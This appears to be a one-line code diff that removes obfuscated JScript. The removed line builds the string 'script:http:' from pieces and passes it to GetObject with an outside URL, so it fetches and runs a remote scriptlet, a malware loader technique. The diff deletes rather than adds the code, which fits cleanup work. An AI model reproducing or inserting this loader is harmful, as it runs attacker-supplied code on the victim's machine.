@@ -1,1 +1,0 @@
-var C66d="sc"+"r" D66d="ip"+"t:h" E66d="T"+"tP"+":" GetObject(C66d+D66d+E66d+'//n7eo5j.realidadeavancada.co/?1/')
